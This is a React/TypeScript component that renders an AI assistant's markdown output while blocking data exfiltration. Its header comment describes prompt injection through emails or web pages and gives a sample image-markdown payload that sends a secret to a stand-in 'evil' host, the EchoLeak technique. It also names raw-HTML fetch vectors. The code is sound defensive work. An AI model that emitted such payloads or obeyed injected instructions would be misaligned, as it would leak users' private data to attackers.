import { memo, useState, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { Copy, Check, ImageOff, ExternalLink } from "lucide-react";

/**
 * Exfiltration-safe markdown renderer for assistant output.
 *
 * Assistant text can be shaped by untrusted tool results (an injected email
 * or web page). Two rendering behaviors would turn that into a live
 * data-exfiltration channel, so both are disabled here:
 *
 * 1. Images are NEVER auto-rendered. A model coaxed into emitting
 *    `![](https://evil/steal?d=SECRET)` would otherwise have the browser
 *    silently GET that URL on render — the EchoLeak primitive. Images are
 *    replaced with an inert placeholder; the URL is shown as text, never
 *    fetched.
 * 2. Raw HTML is not parsed (react-markdown's default — no rehype-raw), so
 *    `<img>`, `<script>`, `onerror=`, and CSS `background:url()` cannot
 *    sneak a fetch in either.
 *
 * Links render but are inert until the user clicks: no prefetch, and the
 * destination host is shown so deceptive link text can't hide where it goes.
 */

const ALLOWED_LINK_SCHEMES = ["http:", "https:", "mailto:"];

function safeHref(href: string | undefined): string | null {
  if (!href) return null;
  try {
    // Resolve relative to the app origin so a bare path is fine; reject any
    // scheme outside the allowlist (javascript:, data:, vbscript:, etc.).
    const url = new URL(href, window.location.origin);
    return ALLOWED_LINK_SCHEMES.includes(url.protocol) ? url.href : null;
  } catch {
    return null;
  }
}

function hostLabel(href: string): string {
  try {
    const url = new URL(href);
    return url.protocol === "mailto:" ? url.pathname : url.host;
  } catch {
    return href;
  }
}

function CodeBlock({ children }: { children: ReactNode }) {
  const [copied, setCopied] = useState(false);
  const text = extractText(children);

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      /* clipboard blocked — no-op */
    }
  };

  return (
    <div className="relative group my-2">
      <button
        type="button"
        onClick={copy}
        aria-label="Copy code"
        className="row-actions absolute top-2 right-2 p-1.5 rounded-[6px]"
        style={{ background: "var(--claw-panel)", border: "1px solid var(--claw-border)", color: "var(--text-muted)" }}
      >
        {copied ? <Check className="w-3.5 h-3.5" style={{ color: "var(--accent-success)" }} /> : <Copy className="w-3.5 h-3.5" />}
      </button>
      <pre
        className="text-xs overflow-x-auto p-3 rounded-[8px]"
        style={{ background: "var(--claw-surface)", border: "1px solid var(--claw-border)", color: "var(--text-primary)" }}
      >
        {children}
      </pre>
    </div>
  );
}

function extractText(node: ReactNode): string {
  if (typeof node === "string") return node;
  if (typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(extractText).join("");
  if (node && typeof node === "object" && "props" in node) {
    // @ts-expect-error — React element children
    return extractText(node.props?.children);
  }
  return "";
}

const components: Components = {
  a({ href, children }) {
    const safe = safeHref(href);
    if (!safe) {
      // Unsafe scheme — render the text inertly, not as a link.
      return <span style={{ color: "var(--text-secondary)" }}>{children}</span>;
    }
    return (
      <a
        href={safe}
        target="_blank"
        rel="noopener noreferrer nofollow"
        className="inline-flex items-center gap-1 underline break-all"
        style={{ color: "var(--accent-primary)" }}
        title={safe}
      >
        {children}
        <ExternalLink className="w-3 h-3 shrink-0" aria-hidden />
        <span className="mono-tag" style={{ color: "var(--text-muted)" }}>
          {hostLabel(safe)}
        </span>
      </a>
    );
  },
  // Images are never fetched: show an inert placeholder with the alt text
  // and the URL as plain (non-fetching) text.
  img({ src, alt }) {
    return (
      <span
        className="inline-flex items-center gap-1.5 px-2 py-1 my-1 rounded-[6px] text-xs align-middle"
        style={{ background: "var(--fill-warning)", border: "1px solid var(--border-warning)", color: "var(--accent-warning)" }}
        title={typeof src === "string" ? src : undefined}
      >
        <ImageOff className="w-3.5 h-3.5 shrink-0" aria-hidden />
        <span>Image hidden for safety{alt ? `: ${alt}` : ""}</span>
      </span>
    );
  },
  p({ children }) {
    return <p className="text-sm leading-relaxed my-1.5" style={{ color: "inherit" }}>{children}</p>;
  },
  ul({ children }) {
    return <ul className="list-disc pl-5 my-1.5 text-sm space-y-0.5">{children}</ul>;
  },
  ol({ children }) {
    return <ol className="list-decimal pl-5 my-1.5 text-sm space-y-0.5">{children}</ol>;
  },
  li({ children }) {
    return <li className="text-sm leading-relaxed">{children}</li>;
  },
  h1({ children }) {
    return <h1 className="text-base font-semibold mt-3 mb-1.5" style={{ color: "var(--text-primary)" }}>{children}</h1>;
  },
  h2({ children }) {
    return <h2 className="text-sm font-semibold mt-3 mb-1.5" style={{ color: "var(--text-primary)" }}>{children}</h2>;
  },
  h3({ children }) {
    return <h3 className="text-sm font-semibold mt-2 mb-1" style={{ color: "var(--text-primary)" }}>{children}</h3>;
  },
  strong({ children }) {
    return <strong className="font-semibold" style={{ color: "var(--text-primary)" }}>{children}</strong>;
  },
  blockquote({ children }) {
    return (
      <blockquote
        className="border-l-2 pl-3 my-2 text-sm italic"
        style={{ borderColor: "var(--accent-primary)", color: "var(--text-secondary)" }}
      >
        {children}
      </blockquote>
    );
  },
  code({ className, children }) {
    // Block code carries a language-* class (from ``` fences); inline code
    // does not. Only block code gets the copy-button treatment.
    const isBlock = /language-/.test(className || "");
    if (isBlock) {
      return <code className={className}>{children}</code>;
    }
    return (
      <code
        className="px-1 py-0.5 rounded text-[0.85em] mono-num"
        style={{ background: "var(--claw-surface)", border: "1px solid var(--claw-border)", color: "var(--accent-primary)" }}
      >
        {children}
      </code>
    );
  },
  pre({ children }) {
    return <CodeBlock>{children}</CodeBlock>;
  },
  table({ children }) {
    return (
      <div className="overflow-x-auto my-2">
        <table className="text-xs border-collapse w-full" style={{ color: "var(--text-secondary)" }}>
          {children}
        </table>
      </div>
    );
  },
  th({ children }) {
    return (
      <th className="text-left px-2 py-1 font-semibold" style={{ borderBottom: "1px solid var(--claw-border)", color: "var(--text-primary)" }}>
        {children}
      </th>
    );
  },
  td({ children }) {
    return <td className="px-2 py-1" style={{ borderBottom: "1px solid var(--border-subtle)" }}>{children}</td>;
  },
};

// Hoisted so the plugin array is referentially stable across renders —
// a fresh array per render defeats react-markdown's internal caching.
const remarkPlugins = [remarkGfm];

function MarkdownMessage({ content }: { content: string }) {
  return (
    <div className="md-message" style={{ color: "var(--text-primary)" }}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        // No rehype-raw: raw HTML in the model output is not parsed, so it
        // cannot smuggle an <img>/<script> fetch past the img override.
        components={components}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}

// Memoized because Chat renders one of these per message and re-renders the
// whole list on every streamed token: without memo, every historical
// message re-parses its markdown per token (O(conversation × tokens)).
// With memo, only the message whose `content` string changed re-parses.
export default memo(MarkdownMessage);
